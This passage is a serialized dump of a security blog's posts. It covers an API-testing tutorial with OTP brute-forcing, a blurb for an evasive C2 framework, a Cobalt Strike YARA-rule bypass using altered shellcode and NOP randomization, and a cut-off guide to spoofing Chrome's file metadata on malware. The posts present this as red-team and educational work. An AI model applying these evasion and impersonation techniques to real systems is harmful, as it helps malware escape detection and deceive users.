src=\&quot;images/4d5f68edd2904c8594a06c3e2b8ba1c1.png\&quot; alt=\&quot;6b98e03ee5bb2b84b48c1463a2df026d.png\&quot; width=\&quot;213\&quot; height=\&quot;69\&quot; /&gt;\n3.  Go to Firefox Settings, Search `Certificates`, and Select `View Certificates`.\n    - &lt;Image src=\&quot;images/d96b0d183b8749d6ab39e7740833a5ec.png\&quot; alt=\&quot;9e9e7f90f79c56bd7957ec8801894ac1.png\&quot; width=\&quot;359\&quot; height=\&quot;127\&quot; /&gt;\n4.  Go to `Authorities`, Select `Import`, and select the `mitmproxy` certificate you previously downloaded:\n    - &lt;Image src=\&quot;images/3532e4c9a2ab4ec6a3ad57631d82f29e.png\&quot; alt=\&quot;a80b0439b3ba20e894738e1bad40d1c8.png\&quot; width=\&quot;248\&quot; height=\&quot;174\&quot; /&gt;\n    - &lt;Image src=\&quot;images/51909b79f5f345bc9026f85808618487.png\&quot; alt=\&quot;9448c122d18ec3fa6054722b4e70e0f1.png\&quot; width=\&quot;329\&quot; height=\&quot;177\&quot; /&gt;\n5.  Now, your when you visit a page you should get the request in the `mitmweb` page and Burp Suite as well.\n\n### Record API Request and Generating OpenAPI Spec File\n\nIn this section, you&#39;ll learn how to record API requests using `mitmweb` and convert them into an OpenAPI 3.0 `spec.yml` file using `mitmproxy2swagger`. This allows you to document and reuse API interactions in tools like Insomnia. Follow these steps:\n\n1.  Once the proxy is set up, explore the target web application until there is nothing left to do to record all possible API requests.\n2.  Next go to the `mitmweb` web server, and click `File /&gt; Save` to save the captured requests.\n    - You can use the `Save filtered` option to only save the requests based on your filter.\n    - &lt;Image src=\&quot;images/7cac87288c7a446ca8e9a212890ef86f.png\&quot; alt=\&quot;55b31489a47d7d452006e749e71d1081.png\&quot; width=\&quot;233\&quot; height=\&quot;113\&quot; /&gt;\n    - &lt;Image src=\&quot;images/ed5493a6eff64abaa9e94b7444f4347f.png\&quot; alt=\&quot;746066160e32f5e08b6d259cc288f8d2.png\&quot; width=\&quot;276\&quot; height=\&quot;151\&quot; /&gt;\n3.  Run the tool below, to convert the `mitmproxy` flow to OpenAPI 3.0 Format:\n    - You can install this tool via its GitHub with docker.\n    - The `--examples` flag enhances your API documentation with examples.\n    ```bash\n    # Without docker\n    sudo mitmproxy2swagger -i &lt;flow-file-location&gt; -o spec.yml -p http://&lt;target-website.com&gt; -f flow --examples\n    ```\n4.  `Mitmproxy2swagger` ignores endpoints it thinks are irreverent, however some are endpoints from our target website.\n    - So, edit the `spec.yml` file and remove the `ignore:` from the endpoints that you want to include.\n    - Only remove `ignore:`, removing spacing or the `-` can result in the script failing to work.\n    - &lt;Image src=\&quot;images/b779f6cac81c462091605993ead6af54.png\&quot; alt=\&quot;\&quot; width=\&quot;385\&quot; height=\&quot;344\&quot; /&gt;\n5.  Run `mitmproxy2swagger` once more, this will correct the format and spacing.\n\n## Using Insomnia\n\nIn this section, we&#39;ll learn how to set up Insomnia for API testing.\n\nAfter [Setting Up Insomnia](#installing-insomnia), you&#39;ll be prompted to create an account. I recommend doing so as it provides access to all program features.\n\nNext, you can follow these steps:\n\n- [Introduction](#introduction)\n- [Support](#support)\n- [Pre-requisites](#pre-requisites)\n  - [Installing Insomnia](#installing-insomnia)\n  - [Installing mitmproxy2swagger](#installing-mitmproxy2swagger)\n  - [Fix common mitmweb/mitmproxy error](#fix-common-mitmwebmitmproxy-error)\n- [Capturing and Converting API Requests to OpenAPI 3.0](#capturing-and-converting-api-requests-to-openapi-30)\n  - [Setup mitmweb proxy listener](#setup-mitmweb-proxy-listener)\n  - [Configure FoxyProxy for mitmweb](#configure-foxyproxy-for-mitmweb)\n  - [Install the mitmweb certificates](#install-the-mitmweb-certificates)\n  - [Record API Request and Generating OpenAPI Spec File](#record-api-request-and-generating-openapi-spec-file)\n- [Using Insomnia](#using-insomnia)\n  - [Creating a Project and Importing OpenAPI Spec Files](#creating-a-project-and-importing-openapi-spec-files)\n  - [Editing Collection Variables](#editing-collection-variables)\n  - [Configuring Insomnia to Use Burp Suite Proxy](#configuring-insomnia-to-use-burp-suite-proxy)\n  - [Organize and Inherit Settings with Insomnia Folders for Scripts, Tokens, and Variables](#organize-and-inherit-settings-with-insomnia-folders-for-scripts-tokens-and-variables)\n    - [Setting Authentication Tokens for Folders](#setting-authentication-tokens-for-folders)\n    - [Setting Scripts for Folders](#setting-scripts-for-folders)\n- [Testing for Public and Outdated API Versions with Insomnia and Burp Suite](#testing-for-public-and-outdated-api-versions-with-insomnia-and-burp-suite)\n  - [Creating a Burp Suite&#39;s HTTP Match and Replace Rule:](#creating-a-burp-suites-http-match-and-replace-rule)\n\n### Creating a Project and Importing OpenAPI Spec Files\n\nBefore using Insomnia, you need to create a project to import your spec.yml file to.\n\n1.  Click on `Create a new Project`:\n    - &lt;Image src=\&quot;images/5d1d44947d024e989e598e990bd1e6e5.png\&quot; alt=\&quot;02343427754da7abdca232640b7171a3.png\&quot; width=\&quot;482\&quot; height=\&quot;147\&quot; /&gt;\n2.  Create a new Collection:\n    - &lt;Image src=\&quot;images/c3f56f68e4b142798ddd5d6072a6c9c6.png\&quot; alt=\&quot;71837a22bbd88c57a127aecd4f8c8a13.png\&quot; width=\&quot;182\&quot; height=\&quot;193\&quot; /&gt;\n    - &lt;Image src=\&quot;images/291f12b54f1e4994a029b3059e5ab546.png\&quot; alt=\&quot;f33f83a5d7d411400be94e8213360b99.png\&quot; width=\&quot;344\&quot; height=\&quot;105\&quot; /&gt;\n3.  Enter in the Collection you just created, click on your Collection name, and Select `From File`.\n    - &lt;Image src=\&quot;images/ce1159b5ae8347a1a37d3c87f30c1bb0.png\&quot; alt=\&quot;5809f14cb3577794803f828a76150b76.png\&quot; width=\&quot;198\&quot; height=\&quot;250\&quot; /&gt;\n4.  Select the `spec.yml` you created from [before](#record-api-request-and-generating-openapi-spec-file), and Click on `Scan /&gt; Import`.\n    - &lt;Image src=\&quot;images/756e8f934da6417a95cfff1491afc293.png\&quot; alt=\&quot;cba6ba0b730a763a8bdd1cc43ad86701.png\&quot; width=\&quot;349\&quot; height=\&quot;157\&quot; /&gt;\n5.  Now, you should see the API Requests were added to your Collection\n    - &lt;Image src=\&quot;images/f19e9c6e9c0340f6a96a08691d65c087.png\&quot; alt=\&quot;4620711a1d4e679cba0ca2b2eb1a2d7c.png\&quot; width=\&quot;176\&quot; height=\&quot;189\&quot; /&gt;\n\n### Editing Collection Variables\n\nIn Insomnia, collection variables are part of the collection environment and function similarly to Postman&#39;s collection variables. These variables store reusable values, such as API keys, URLs, or other configuration details, that can be accessed across all requests within a collection.\n\nHere&#39;s how you can modify them and use them:\n\n1.  Click on `Base Environment`, to edit the current Collection Variables select the pencil next to `Collection Environments`.\n    - &lt;Image src=\&quot;images/58600e10a6e149a8be2f71ba50bb592b.png\&quot; alt=\&quot;cec4984d5aeb157b894d73f7030ec00d.png\&quot; width=\&quot;178\&quot; height=\&quot;165\&quot; /&gt;\n2.  You can also use the Collection variables from the `spec.yml` file.\n    - &lt;Image src=\&quot;images/66b68da433e14df7bbb42893cd0b5634.png\&quot; alt=\&quot;3fb5db311d9eb642a4ff930c7326fa90.png\&quot; width=\&quot;247\&quot; height=\&quot;81\&quot; /&gt;\n3.  Now, the URL preview should include your API URL.\n    - &lt;Image src=\&quot;images/781bb35a95c94b0480169b448dc58415.png\&quot; alt=\&quot;3953a7f25966fb595c16adb12238ffd4.png\&quot; width=\&quot;363\&quot; height=\&quot;185\&quot; /&gt;\n\n### Configuring Insomnia to Use Burp Suite Proxy\n\nYou can set up Insomnia to route traffic through Burp Suite, enabling you to intercept and analyze API requests in real time. Once configured, all requests sent from Insomnia will be captured by Burp Suite for inspection and testing.\n\n1.  In Insomnia, Go to `Application &gt; Preferences &gt; Proxy`.\n2.  Check `Enable Proxy`, and enter the Burp Suite Proxy address:\n    - &lt;Image src=\&quot;images/905f545c9fb144cfaac5bd6fbd54b98f.png\&quot; alt=\&quot;6eded766a9774f1cb69981045e3382c6.png\&quot; width=\&quot;363\&quot; height=\&quot;103\&quot; /&gt;\n3.  Now, any request you send via Insomnia will be also intercepted by Burp Suite.\n4.  For example, I will send a POST request to `forget-password` for the email `test@gmail.com`:\n    - &lt;Image src=\&quot;images/6dc84d905e40463fb1479e827b4bbb17.png\&quot; alt=\&quot;86c50c2292f79d946b0386c4c704483a.png\&quot; width=\&quot;399\&quot; height=\&quot;145\&quot; /&gt;\n    - The request above also shows in Burp Suite as seen below:\n        - &lt;Image src=\&quot;images/f1a25494f6c243fa94518089ee073846.png\&quot; alt=\&quot;b072f8db38cb24900bba0fd0aa844528.png\&quot; width=\&quot;171\&quot; height=\&quot;147\&quot; /&gt;\n        - &lt;Image src=\&quot;images/869fb1be4bf54bac84ddf9267168cc1b.png\&quot; alt=\&quot;d952c3036dc9c20a604fcb1524c6e3cb.png\&quot; width=\&quot;424\&quot; height=\&quot;144\&quot; /&gt;\n\n### Organize and Inherit Settings with Insomnia Folders for Scripts, Tokens, and Variables\n\nInsomnia folders allow you to manage shared settings like Scripts, Authentication Tokens, and Environment Variables for all requests within a folder. With the default \&quot;Inherit from Parent\&quot; setting, requests automatically use these configurations.\n\n1.  [Setting Authentication Tokens for Folders](#setting-authentication-tokens-for-folders)\n2.  [Setting Scripts for Folders](#setting-scripts-for-folders)\n\n#### Setting Authentication Tokens for Folders\n\nThe request below only works when a user is logged in. If I send the request without any Authentication token it will give a 401 error:\n\n- &lt;Image src=\&quot;images/7f1884b007fb4df792f81105f40a4d4f.png\&quot; alt=\&quot;c3524fd96f71fbcb6bf1242510fe7530.png\&quot; width=\&quot;291\&quot; height=\&quot;84\&quot; /&gt;\n\nTo fix this we can add authentication tokens to request like so:\n\n- &lt;Image src=\&quot;images/c329b383327245109e8a168b81b9c498.png\&quot; alt=\&quot;ce7b1083008f5fb5512ed33746c63db3.png\&quot; width=\&quot;159\&quot; height=\&quot;179\&quot; /&gt;\n\nHowever, this would be tedious to add a authentication token for each request, so we can create folder for authenticated requests and set the Authentication Token for all requests, like so:\n\n1.  Get a token from the `POST` Login request\n    - &lt;Image src=\&quot;images/74ed624a19bc4a6298fab1a3cc0e65bd.png\&quot; alt=\&quot;43a0438c743e7577e39fc144c0cfd27d.png\&quot; width=\&quot;429\&quot; height=\&quot;136\&quot; /&gt;\n2.  Create a folder named and put your authenticated requests inside of it.\n3.  Click on the folder you created, Go to `Auth`, Select the `Bearer Token` option, and paste your token.\n    - &lt;Image src=\&quot;images/6e0c869f3f28401dbabe912b918ca11e.png\&quot; alt=\&quot;d1257fd81b837569a5924fe6c1a213c0.png\&quot; width=\&quot;312\&quot; height=\&quot;129\&quot; /&gt;\n4.  Now, if you send any authenticated request it will have the Bearer Token and give a `200 OK` response.\n    - &lt;Image src=\&quot;images/78abd35f880d4bf7a9981fce7870c7ba.png\&quot; alt=\&quot;d125f9c2201130080a8398f366b1d424.png\&quot; width=\&quot;266\&quot; height=\&quot;77\&quot; /&gt;\n\n#### Setting Scripts for Folders\n\nYou can also set scripts for all the requests in the folder. In this example, lets check if the requests return a 200 status code.\n\n1.  Click on your folder, and Select `Scripts &gt; After-response`.\n    - Like the name suggests, After-response scripts execute after getting the request response.\n2.  Using the code we can check if status is 200:\n    - &lt;Image src=\&quot;images/88dd6875b1cd4b7cb2c71f81c63ed388.png\&quot; alt=\&quot;b6562fd3197cce4d29f1f08ec57dae45.png\&quot; width=\&quot;313\&quot; height=\&quot;127\&quot; /&gt;\n    ```js\n    insomnia.test(&#39;Check if status is 200&#39;, () =&gt; {\n    insomnia.expect(insomnia.response.code).to.eql(200);\n    });\n    ```\n3.  To run the scripts, Right-Click on your folder, and Select `Run Folder`:\n    - &lt;Image src=\&quot;images/0482e55840ae43988571a0b9b10bead5.png\&quot; alt=\&quot;f81b0252ab548e64209da51bc08799b1.png\&quot; width=\&quot;315\&quot; height=\&quot;108\&quot; /&gt;\n4.  Check `Select all` to select all your requests in the folder and Press `Run`:\n    - &lt;Image src=\&quot;images/0b0c0ef554494d5b8b94373649955e8b.png\&quot; alt=\&quot;4bda311b87ac695e2cf6c07434b2acfe.png\&quot; width=\&quot;262\&quot; height=\&quot;155\&quot; /&gt;\n5.  After running you will get the results of the tests as shown below:\n    - &lt;Image src=\&quot;images/cc19036155f04c6a9d9b224b695e0e73.png\&quot; alt=\&quot;49f14feb7c35dabd8cffc765b16a3d38.png\&quot; width=\&quot;335\&quot; height=\&quot;185\&quot; /&gt;\n\n## Testing for Public and Outdated API Versions with Insomnia and Burp Suite\n\n(AKA Testing for Improper Assets Management)\n\nIn this section, I will show you how to combine Insomnia and Burp Suite to test for outdated API versions, as an alternative to using Postman.\n\nIn the [API Penetration Testing course](https://www.apisecuniversity.com/courses/api-penetration-testing) from APISecUniversity, Corey Ball demonstrates how to find outdated API versions using Postman.\n\nA quick explanation of this vulnerability from my notes:\n\n&gt; Testing for Public and Outdated API Versions involves identifying unsupported, outdated, or non-production versions of an API that may still be accessible. These older versions often lack patches for vulnerabilities fixed in newer releases, making them a potential security risk.\n&gt; \n&gt; Finding undocumented API versions may indicate a Insufficient Technical Documentation vulnerability ([CWE-1059](https://cwe.mitre.org/data/definitions/1059.html)), or even lead to more severe findings and the compromise of the client.\n\nTo find this vulnerability he uses the `Find and Replace` feature in Postman to modify all requests that contain a `v3` version in the request and change them to `v2`, then runs the [after-response script](#setting-scripts-for-folders) I showed you earlier to see if this change modifies the response in any request.\n\nIn the example, the `check-otp` endpoint still returned a `500` error instead of a `404 NOT Found` error. This indicates that an old version of the `check-otp` endpoint still exists.\n\nAlthough Insomnia doesn&#39;t have a `Find and Replace` feature, Burp Suite, which intercepts all Insomnia requests, offers HTTP match and replace rules to modify any string in the HTTP request or response.\n\nThis means we create a HTTP match and replace rule to automate this process!\n\n### Creating a Burp Suite&#39;s HTTP Match and Replace Rule:\n\n1.  Open Burp Suite&#39;s Settings, Go to `Tools &gt; Proxy &gt; HTTP match and replace rules`, and Click on `Add`.\n    - &lt;Image src=\&quot;images/58d19fe345a0458d9e1107b65d08df83.png\&quot; alt=\&quot;6c423337a20f65c2443b26b4b39de788.png\&quot; width=\&quot;323\&quot; height=\&quot;164\&quot; /&gt;\n2.  In this new window, enter the following information and press `OK`:\n    - Type: Request first line\n    - Match: v3\n    - Replace: v2\n    - Comment (Optional): Change HTTP Path from v3 to v2\n    - &lt;Image src=\&quot;images/fd6a825fe66343fa86543424a49a5404.png\&quot; alt=\&quot;43fc42434fcd31891f515510cf1753bc.png\&quot; width=\&quot;394\&quot; height=\&quot;218\&quot; /&gt;\n3.  Now, when you resend the `check-otp` request, the `v3` path will automatically be replaced with `v2`, resulting in a different response:\n    - Without the match and replace rule:\n        - &lt;Image src=\&quot;images/14fac351f84f426595ffcb25519ceb6e.png\&quot; alt=\&quot;b31a0e88ce19f378b78350d2ee73f167.png\&quot; width=\&quot;298\&quot; height=\&quot;71\&quot; /&gt;\n    - With match and replace rule:\n        - &lt;Image src=\&quot;images/a150c7c9217246618b697ee9cc3b748f.png\&quot; alt=\&quot;2735a32f59c0d29c22338f7712177c56.png\&quot; width=\&quot;303\&quot; height=\&quot;88\&quot; /&gt;\n4.  Now that the response has changed, we can attempt to brute-force the 4-digit OTP:\n    - I will use Burp Suite Intruder for this example:\n    - &lt;Image src=\&quot;images/3fa1f4c0c8ed40398c7a747ae53513d8.png\&quot; alt=\&quot;b857fd4f0147fa90f94a87e2b5341346.png\&quot; width=\&quot;483\&quot; height=\&quot;140\&quot; /&gt;\n    - &lt;Image src=\&quot;images/8dac3d27cce143bb9ca5f65060a66e2b.png\&quot; alt=\&quot;1d8853d7ab8f43c875dcf98fb0656a50.png\&quot; width=\&quot;389\&quot; height=\&quot;181\&quot; /&gt;&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/api-testing-insomnia-burp-suite.mdx&quot;],&quot;digest&quot;:[0,&quot;8b5dd7b719d2f930&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;api-testing-insomnia-burp-suite&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/api_testing_with_insomnia_burp_suite.s2_5BSIN.png&quot;],&quot;width&quot;:[0,1286],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;helix-c2.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Helix C2: Modular &amp; Evasive C2 Framework&quot;],&quot;date&quot;:[3,&quot;2024-11-25T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/helix-c2.png&quot;],&quot;tags&quot;:[1,[[0,&quot;C2 Framework&quot;],[0,&quot;Red Team&quot;],[0,&quot;Malware Development&quot;],[0,&quot;IDS Evasion&quot;],[0,&quot;Open Source&quot;],[0,&quot;Educational&quot;],[0,&quot;Cybersecurity&quot;]]],&quot;description&quot;:[0,&quot;A modular command and control framework with randomized request chunking for IDS evasion. Designed to be educational, open source, and simpler than Mythic C2.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\n\n## What is Helix C2?\nA modular command and control framework designed to be simpler than Mythic C2 while maintaining flexibility. Built for rapid experimentation and learning.\n\n**Helix C2 Status: &lt;span class=\&quot;text-sky-600\&quot;&gt;In Development&lt;/span&gt;**\n\n## Preview \n\n&lt;Image src=\&quot;images/1732547320210.jpg\&quot; alt=\&quot;fc5156f67325c8e5433bf4fb4bcfa641.png\&quot; scale=\&quot;0.5\&quot;/&gt;\n\n## Features &amp; Design Philosophy\n\n**Open Source &amp; Educational Focus**\n\nAll code will be made public with detailed documentation and heavy commenting, enabling anyone to understand and build upon it as a foundation for their own agents.\n\n**Key Principles:**\n- Open source with detailed documentation\n- Heavily commented code for educational purposes\n- Balance between simplicity and functionality\n- Modular architecture for customization\n\n**Use Cases:**\n- Framework is modular and intuitive for red team operations\n- Can be quickly customized for diverse assessment needs\n- Suitable as educational foundation and for advanced use cases\n\n### Evasion Features\nTo prevent detection by intrusion detection systems (IDS), Helix C2 implements:\n\n- **Randomized Request Chunking**: Requests are split into random-sized chunks, making it impossible to fingerprint request sizes based on patterns\n- **Dynamic Size Variation**: Each transmission varies in size, reducing the risk of signature-based detection while maintaining data integrity\n- *(More features will be added as development continues)*\n\n## Dashboard UI\nThe base dashboard UI is designed to be clear and intuitive, helping operators quickly focus on what matters most.\n\n**Status Indicators:**\n- 👑 = Admin privileges\n- 💻 = Active/connected agent\n- 🕐 = Registration in progress\n\n&amp;nbsp;\n\n***More updates coming as development continues***&quot;],&quot;filePath&quot;:[0,&quot;src/content/projects/helix-c2.mdx&quot;],&quot;digest&quot;:[0,&quot;7d058b310d0b694d&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;projects&quot;],&quot;slug&quot;:[0,&quot;helix-c2&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/helix-c2.Dhe8oFcV.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;bypass-yara-rule-cobaltstrike.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Bypass YARA Rule f0b627fc for CobaltStrike to Evade EDRs&quot;],&quot;date&quot;:[3,&quot;2024-10-16T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/bypass_yara_f0b627fc_evade_edrs.png&quot;],&quot;tags&quot;:[1,[[0,&quot;EDR Evasion&quot;],[0,&quot;Cobalt Strike&quot;],[0,&quot;Python&quot;],[0,&quot;YARA Evasion&quot;],[0,&quot;Shellcode&quot;],[0,&quot;Red Team&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;Bypass Yara Rule Windows_Trojan_CobaltStrike_f0b627fc by randomizing its shellcode signature using a Python script.&quot;],&quot;featured&quot;:[0,3],&quot;repo&quot;:[0,&quot;andrecrafts/CobaltStrike-YARA-Bypass-f0b627fc&quot;],&quot;stars&quot;:[0,43],&quot;projectSlug&quot;:[0,&quot;andrecrafts/CobaltStrike-YARA-Bypass-f0b627fc&quot;]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\nimport Video from &#39;src/components/VideoLocal.astro&#39;;\n\n## Overview of YARA rule evasion\n\nIn a [White Knight Labs blog post](https://whiteknightlabs.com/2023/05/23/unleashing-the-unseen-harnessing-the-power-of-cobalt-strike-profiles-for-edr-evasion/) about EDR evasion with Cobalt Strike, they discussed methods for bypassing YARA rules targeting Cobalt Strike. One of the most challenging rules to bypass is [Windows_Trojan_CobaltStrike_f0b627fc](https://github.com/elastic/protections-artifacts/blob/main/yara/rules/Windows_Trojan_CobaltStrike.yar#L874).\n\nThis specific rule targets a 10-byte sequence found within the Cobalt Strike binary:\n```python\n\\x25\\xff\\xff\\xff\\x00\\x3d\\x41\\x41\\x41\\x00\n```\nEven after employing sleep masks and utilizing the sleep mask kit to generate custom masks, this byte sequence persists in the final shellcode. Using the Defuse.ca x64 Disassembler, we can see that this shellcode translates to the following assembly instructions:\n\n```bash\nand    eax, 0xffffff  \ncmp    ecx, 0x414141\n```\n\nIn the White Knight Labs post, they bypassed this detection by modifying the instruction from `AND EAX, 0xFFFFFF` to `MOV EAX, 0xFFFFFF`. This results in the following altered shellcode:\n\n```python\n\\xB8\\xFF\\xFF\\xFF\\x00\\x3D\\x41\\x41\\x41\\x00\n```\n\nHowever, while this approach alters the `AND` instruction, the `CMP` instruction remains the same, meaning that this modified shellcode could still be detected by a newly crafted YARA rule.\n\n## A More Effective Bypass\n\nThrough experimentation, I found that you can actually remove the cmp instruction altogether. By simply setting EAX to 0xFFFFFF, the Cobalt Strike beacon functions as expected.\n\nHere are some alternative shellcode sequences you can use to avoid detection:\n- `MOV EAX, 0x00414141`\n- `XOR EAX, EAX; MOV EAX, 0x00414141`\n\nIn this case, `XOR EAX, EAX` zeroes out the `EAX` register before setting it to `0x00414141`. \n\nThis slight variation in the instructions changes the shellcode without affecting the overall functionality, making it harder for static analysis tools to signature.\n\n## Randomizing Shellcode with NOP Instructions\n\nWhile the above methods help evade the original rule, the new shellcode could still be signatured. \n\nTo counter this, I developed a script that automatically replaces the original byte sequence `\\x25\\xff\\xff\\xff\\x00\\x3d\\x41\\x41\\x41\\x00` with the alternative shellcode, and then randomly inserts NOP instructions (`\\x90` and `\\x87\\xC0`) into the shellcode.\n\nNOP (No Operation) instructions don&#39;t affect the execution flow but add randomization to the shellcode. By inserting NOPs at random positions—at the start, middle, or end of the shellcode—you can further obfuscate the shellcode, making it even more challenging to signature.\n\n## Key Considerations for Implementing Shellcode Alternatives\n\nWhen implementing alternative shellcode, keep the following in mind:\n- **Shellcode Size:** The total shellcode size cannot exceed 10 bytes, as that is the length of the original sequence.\n- **Smaller Sizes for Randomization:** It’s preferable to use shellcode sequences shorter than 10 bytes, allowing the Python script to insert NOPs and reuse them in future iterations for better evasion.\n\n## Usage Example &amp; GitHub Repository\n\nHere&#39;s an usage example, where I replace the bytes of http_x64.xthread.bin and save it to beacon.bin:\n\n&lt;Image src=\&quot;images/e883224e3e150b0de4ce4b4b2fe54a9602f8cd00.png\&quot; alt=\&quot;e883224e3e150b0de4ce4b4b2fe54a9602f8cd00.png\&quot; width=\&quot;549\&quot; height=\&quot;150\&quot; /&gt;\n\nYou can find the Python script for bypassing the YARA rule on my GitHub:\n\n[https://github.com/WafflesExploits/CobaltStrike-YARA-Bypass-f0b627fc](https://github.com/WafflesExploits/CobaltStrike-YARA-Bypass-f0b627fc)\n\nIn addition, I&#39;ve included Python scripts from White Knight Labs for generating Rich headers and prepend headers, with minor improvements.&quot;],&quot;filePath&quot;:[0,&quot;src/content/posts/bypass-yara-rule-cobaltstrike.mdx&quot;],&quot;digest&quot;:[0,&quot;2edb4cf013bbe112&quot;],&quot;deferredRender&quot;:[0,true],&quot;collection&quot;:[0,&quot;posts&quot;],&quot;slug&quot;:[0,&quot;bypass-yara-rule-cobaltstrike&quot;],&quot;render&quot;:[0,null],&quot;imageMeta&quot;:[0,{&quot;src&quot;:[0,&quot;/_astro/bypass_yara_f0b627fc_evade_edrs.D_48sdOF.png&quot;],&quot;width&quot;:[0,1285],&quot;height&quot;:[0,630],&quot;format&quot;:[0,&quot;png&quot;]}],&quot;isSuperseded&quot;:[0,false]}],[0,{&quot;id&quot;:[0,&quot;spoofing-file-details.mdx&quot;],&quot;data&quot;:[0,{&quot;title&quot;:[0,&quot;Make Your Malware Look Legitimate: Spoofing File Details&quot;],&quot;date&quot;:[3,&quot;2024-10-13T00:00:00.000Z&quot;],&quot;image&quot;:[0,&quot;heroImages/spoofing-file-details.png&quot;],&quot;tags&quot;:[1,[[0,&quot;EDR Evasion&quot;],[0,&quot;C++&quot;],[0,&quot;Shellcode&quot;],[0,&quot;Shellcode Loader&quot;],[0,&quot;Malware Development&quot;],[0,&quot;AV Evasion&quot;],[0,&quot;Red Team&quot;],[0,&quot;Stealth Techniques&quot;],[0,&quot;Programming&quot;]]],&quot;description&quot;:[0,&quot;Learn how to make your malware appear as legitimate software by adding an icon to your malware, and copying file properties from real programs.&quot;],&quot;featured&quot;:[0,0],&quot;projectSlug&quot;:[0]}],&quot;body&quot;:[0,&quot;import Image from &#39;src/components/ImageLocal.astro&#39;;\n\n## Why Spoof File Properties?\n\nWhen you right-click a file and check its \&quot;Details\&quot; tab, you see information like the company name, product version, and description. \n\n- &lt;Image src=\&quot;images/c341ab45ff7b4a4a84d48842f6a218e0.png\&quot; alt=\&quot;Showing chrome.exe file details\&quot; scale=\&quot;0.6\&quot; /&gt;\n\nBy copying these properties to your malware, you make it look less suspicious to both users and security tools. Instead of appearing as an unknown executable, your file can look like it came from Microsoft, Google, or any trusted company.\n\n## Adding Spoofed Metadata in Visual Studio\n\n1. Add a New Item to Your Project\n   - Right-click the project, select `&#39;Add&#39; &gt; &#39;New Item&#39;`\n   - &lt;Image src=\&quot;images/8d22bb20417340f394f7682c6fc3977f.png\&quot; alt=\&quot;8228033a0bfb647f724f9802fe792b05.png\&quot; width=\&quot;338\&quot; height=\&quot;251\&quot;/&gt;\n2. Add a Resource (`.rc`) File\n   - Select \&quot;Resource File (.rc)\&quot; and optionally rename it to `metadata.rc`.\n   - &lt;Image src=\&quot;images/c5b2192e855849b595627455efbb0249.png\&quot; alt=\&quot;b7386aebdea6a960a6a55c8cedef0787.png\&quot; width=\&quot;322\&quot; height=\&quot;265\&quot;/&gt;\n3. Exit Resource Viewer\n   - Visual Studio will automatically open the resource viewer. Close it by clicking the &#39;X&#39; - we&#39;ll edit the file as text instead.\n   - &lt;Image src=\&quot;images/6d4e4fba95c94b95b4359c0df0db5b0f.png\&quot; alt=\&quot;a1c45eb1ae5e3e422ab4b85f14755b4d.png\&quot; width=\&quot;211\&quot; height=\&quot;69\&quot;/&gt; \n4. Open the File as Text\n   - Right-click the resource file, and select `&#39;Open With&#39; &gt; &#39;Source Code (Text) Editor&#39;`.\n   - &lt;Image src=\&quot;images/cbb5951fa440476799f336df136f50be.png\&quot; alt=\&quot;8ddcafec1ab8a8817b9bc50bf8959b56.png\&quot; width=\&quot;140\&quot; height=\&quot;56\&quot;/&gt;\n   - &lt;Image src=\&quot;images/c0eb2116475d490cbd0beee009ff61c3.png\&quot; alt=\&quot;fbf4e5fc9aef297630ae1bf7ae16ab20.png\&quot; width=\&quot;283\&quot; height=\&quot;95\&quot;/&gt;\n5. Insert the Metadata\n   - Scroll to the bottom of the file and paste this code. Modify the values to match whatever legitimate program you want to impersonate:\n\n```cpp\n1 VERSIONINFO\nFILEVERSION 112, 0, 5615, 88 // File version separated by commas\nPRODUCTVERSION 1, 0, 0, 0\nFILEFLAGSMASK 0x0L\n#ifdef _DEBUG\n   FILEFLAGS 0x1L\n#else\n   FILEFLAGS 0x0L\n#endif\n   FILEOS 0x0L\n   FILETYPE 0x0L\n   FILESUBTYPE 0x0L\nBEGIN\n   BLOCK \&quot;StringFileInfo\&quot;\n   BEGIN\n      BLOCK \&quot;040904B0\&quot;\n      BEGIN\n         // Modify the values below to match your target program\n         VALUE \&quot;CompanyName\&quot;, \&quot;Google LLC.\&quot;\n         VALUE \&quot;FileDescription\&quot;, \&quot;Google Chrome\&quot;\n         VALUE \&quot;InternalName\&quot;, \&quot;Chrome\&quot;\n         VALUE \&quot;LegalCopyright\&quot;, \&quot;Copyright 2023 Google LLC.\&quot; \n         VALUE \&quot;OriginalFilename\&quot;, \&quot;chrome.exe\&quot;\n         VALUE \&quot;ProductName\&quot;, \&quot;Google Chrome\&quot;\n         VALUE \&quot;ProductVersion\&quot;, \&quot;112.0.5615.86\&quot;\n      END\n   END\n   BLOCK \&quot;VarFileInfo\&quot;\n   BEGIN\n      VALUE \&quot;Translation\&quot;, 0x409, 1200\n   END\nEND\n```\n\n## Extract File Properties from Any Program\n\nThe example above uses Chrome&#39;s file properties. To copy properties from any legitimate program (including DLLs), use this PowerShell script:\n\n- &lt;Image src=\&quot;images/db74d701cb054711b5c33107b7d9d3e4.png\&quot; alt=\&quot;d1d738c91d8d3a7359e7b1ca719c4637.png\&quot; width=\&quot;349\&quot; height=\&quot;232\&quot;/&gt;\n\n```powershell\n# Usage: .\\script.ps1 \&quot;C:\\Path\\To\\Program.exe\&quot;\n$path = $args[0]\n\n# Get the file version information\n$file = Get-Item $path\n$versionInfo = $file.VersionInfo\n\n# Print all properties in 